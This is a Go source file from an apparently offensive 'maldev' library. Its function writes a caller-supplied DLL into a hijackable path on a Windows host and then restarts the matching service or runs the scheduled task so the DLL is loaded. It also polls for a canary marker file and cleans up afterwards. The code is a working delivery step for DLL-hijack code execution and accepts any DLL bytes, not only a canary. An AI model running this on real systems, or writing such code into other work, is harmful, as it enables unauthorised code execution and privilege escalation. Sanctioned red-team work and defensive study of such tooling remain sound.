//go:build windows

package dllhijack

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"

	"github.com/oioio-space/maldev/persistence/scheduler"
)

// ValidationResult reports the outcome of a canary-validation attempt.
type ValidationResult struct {
	Dropped        bool      // canary DLL was successfully dropped at HijackedPath
	Triggered      bool      // victim was successfully triggered
	Confirmed      bool      // marker file appeared within Timeout
	MarkerPath     string    // path where the marker was found
	MarkerContents []byte    // marker file contents
	TriggerAt      time.Time // when the trigger fired (for latency analysis)
	ConfirmedAt    time.Time // when the marker was observed
	CleanedUp      bool      // canary DLL + markers were removed on exit
	Errors         []string  // non-fatal errors collected along the flow
}

// ValidateOpts tunes Validate's behaviour. Zero value is the default:
// poll C:\ProgramData\maldev-canary-*.marker for up to 15 seconds, and
// always remove the canary on exit.
type ValidateOpts struct {
	// MarkerGlob is a filepath glob pattern to poll. Default:
	// "maldev-canary-*.marker".
	MarkerGlob string
	// MarkerDir is where to poll. Default: %ProgramData% (C:\ProgramData).
	MarkerDir string
	// Timeout bounds how long we wait for a marker. Default: 15 * time.Second.
	Timeout time.Duration
	// PollInterval bounds how often we check. Default: 200 * time.Millisecond.
	PollInterval time.Duration
	// KeepCanary skips cleanup of the dropped DLL. The marker files are
	// always removed.
	KeepCanary bool
}

func (o *ValidateOpts) defaults() {
	if o.MarkerGlob == "" {
		o.MarkerGlob = "maldev-canary-*.marker"
	}
	if o.MarkerDir == "" {
		if pd := os.Getenv("ProgramData"); pd != "" {
			o.MarkerDir = pd
		} else {
			o.MarkerDir = `C:\ProgramData`
		}
	}
	if o.Timeout == 0 {
		o.Timeout = 15 * time.Second
	}
	if o.PollInterval == 0 {
		o.PollInterval = 200 * time.Millisecond
	}
}

// Validate attempts end-to-end confirmation that Opportunity opp is
// exploitable: drop canaryDLL at opp.HijackedPath, trigger the victim
// (restart the service / run the task), and poll opts.MarkerDir for a
// marker file matching opts.MarkerGlob. The caller supplies the canary
// — it must be a DLL whose DllMain writes a file whose name matches
// MarkerGlob into MarkerDir on DLL_PROCESS_ATTACH. See
// docs/techniques/evasion/dll-hijack.md for a sample 30-line canary.c.
//
// Cleanup runs unconditionally: the dropped canary DLL is removed
// (unless opts.KeepCanary) and every file matching the glob in
// MarkerDir is removed. Errors during cleanup are collected in
// result.Errors but do not fail the call.
//
// KindProcess opportunities are not supported here — reliably
// triggering a DLL reload in a running process requires process
// restart, which is outside the scope of this helper.
//
// Requires MALDEV_INTRUSIVE-level trust on test runs; this function
// writes to disk and starts services/tasks on the host.
func Validate(opp Opportunity, canaryDLL []byte, opts ValidateOpts) (*ValidationResult, error) {
	opts.defaults()

	result := &ValidationResult{}

	if opp.HijackedPath == "" {
		return result, fmt.Errorf("dllhijack/validate: Opportunity has no HijackedPath")
	}
	if len(canaryDLL) == 0 {
		return result, fmt.Errorf("dllhijack/validate: canaryDLL is empty")
	}

	// Snapshot pre-existing markers so we don't match someone else's.
	preMarkers := scanMarkers(opts.MarkerDir, opts.MarkerGlob)

	// Cleanup always runs.
	defer func() {
		result.CleanedUp = true
		if !opts.KeepCanary {
			if err := os.Remove(opp.HijackedPath); err != nil && !os.IsNotExist(err) {
				result.Errors = append(result.Errors, "remove canary: "+err.Error())
				result.CleanedUp = false
			}
		}
		for m := range scanMarkers(opts.MarkerDir, opts.MarkerGlob) {
			if _, ok := preMarkers[m]; ok {
				continue
			}
			// Retry — the writer may still hold the handle briefly
			// (ShareDeny in CreateFile, or multi-step writers like
			// PowerShell's Out-File). 3 attempts × 200ms covers most.
			var rmErr error
			for attempt := 0; attempt < 3; attempt++ {
				if rmErr = os.Remove(m); rmErr == nil || os.IsNotExist(rmErr) {
					rmErr = nil
					break
				}
				time.Sleep(200 * time.Millisecond)
			}
			if rmErr != nil {
				result.Errors = append(result.Errors, "remove marker "+m+": "+rmErr.Error())
			}
		}
	}()

	// Drop.
	if err := os.WriteFile(opp.HijackedPath, canaryDLL, 0o644); err != nil {
		return result, fmt.Errorf("dllhijack/validate: drop canary at %s: %w", opp.HijackedPath, err)
	}
	result.Dropped = true

	// Trigger.
	result.TriggerAt = time.Now()
	if err := triggerVictim(opp); err != nil {
		return result, fmt.Errorf("dllhijack/validate: trigger %s %q: %w", opp.Kind, opp.ID, err)
	}
	result.Triggered = true

	// Poll for a new marker.
	deadline := time.Now().Add(opts.Timeout)
	for time.Now().Before(deadline) {
		now := scanMarkers(opts.MarkerDir, opts.MarkerGlob)
		for m := range now {
			if _, existed := preMarkers[m]; !existed {
				result.Confirmed = true
				result.ConfirmedAt = time.Now()
				result.MarkerPath = m
				if b, err := os.ReadFile(m); err == nil {
					result.MarkerContents = b
				} else {
					result.Errors = append(result.Errors, "read marker: "+err.Error())
				}
				return result, nil
			}
		}
		time.Sleep(opts.PollInterval)
	}
	return result, nil // not confirmed, but not a fatal error
}

func triggerVictim(opp Opportunity) error {
	switch opp.Kind {
	case KindService:
		return triggerService(opp.ID)
	case KindScheduledTask:
		return scheduler.Run(opp.ID)
	case KindProcess:
		// Original rejection: killing + relaunching a live process is
		// too destructive for a reconnaissance helper. Re-eval (2026-04-25):
		// the *correct* pattern is to spawn a *fresh* copy of the same
		// binary in a sandboxed working directory (the dropped canary
		// reproduces the production DLL search path) and terminate it
		// once a marker fires. This validates the binary's hijack
		// behavior without touching the live PID. Implementation kept
		// as deferred work — needs (a) a sandboxed-spawn helper that
		// doesn't inherit the parent's environment, (b) a strict
		// timeout to terminate child processes that don't exit on
		// their own, (c) AV-allow-listing of the canary because some
		// binaries are signed and refuse unsigned co-located DLLs.
		// See docs/techniques/evasion/dll-hijack.md "KindProcess
		// roadmap" for the design sketch.
		return fmt.Errorf("triggering KindProcess opportunities is deferred work — sandboxed-spawn pattern designed but not yet shipped (see dll-hijack.md)")
	default:
		return fmt.Errorf("unknown Kind %v", opp.Kind)
	}
}

func triggerService(name string) error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect SCM: %w", err)
	}
	defer m.Disconnect()
	s, err := m.OpenService(name)
	if err != nil {
		return fmt.Errorf("OpenService(%s): %w", name, err)
	}
	defer s.Close()
	st, err := s.Query()
	if err != nil {
		return fmt.Errorf("Query(%s): %w", name, err)
	}
	if st.State == svc.Running {
		// Stop so the start re-loads DLLs.
		if _, err := s.Control(svc.Stop); err != nil {
			return fmt.Errorf("Stop(%s): %w", name, err)
		}
		// Wait until actually stopped (short).
		for i := 0; i < 40 && st.State != svc.Stopped; i++ {
			time.Sleep(100 * time.Millisecond)
			st, err = s.Query()
			if err != nil {
				return fmt.Errorf("Query post-stop(%s): %w", name, err)
			}
		}
	}
	return s.Start()
}

// scanMarkers returns the set of files in dir whose basename matches
// glob. Errors are swallowed (treated as empty set) — validation polls
// repeatedly and an intermittent filesystem hiccup should not abort.
func scanMarkers(dir, glob string) map[string]struct{} {
	paths, err := filepath.Glob(filepath.Join(dir, glob))
	if err != nil {
		return nil
	}
	out := make(map[string]struct{}, len(paths))
	for _, p := range paths {
		// Defensive: require the basename to actually look like a marker
		// (*.marker), avoids false positives if MarkerGlob is accidentally
		// something wide.
		if !strings.HasSuffix(p, ".marker") {
			continue
		}
		out[p] = struct{}{}
	}
	return out
}
